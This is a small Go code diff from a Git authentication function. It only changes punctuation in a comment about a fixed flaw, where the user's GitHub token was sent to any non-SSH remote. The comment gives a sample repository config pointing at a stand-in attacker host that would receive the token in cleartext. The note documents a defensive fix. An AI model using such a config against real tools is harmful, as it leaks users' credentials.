@@ -115,7 +115,7 @@ var githubHosts = map[string]bool{
 // blueprint is: this used to attach the user's GitHub token to every non-SSH
 // remote, which meant `{url: "http://attacker.tld/r.git", private: true}` mailed
 // the PAT to the attacker in cleartext. The token now goes to GitHub's hosts and
-// nowhere else, and http:// is refused for private repos outright — there is no
+// nowhere else, and http:// is refused for private repos outright - there is no
 // safe way to send a credential over it.
 func getAuthMethod(rawURL string, initConfig *types.InitConfig) (transport.AuthMethod, error) {
 	if !strings.HasPrefix(rawURL, "git@") {
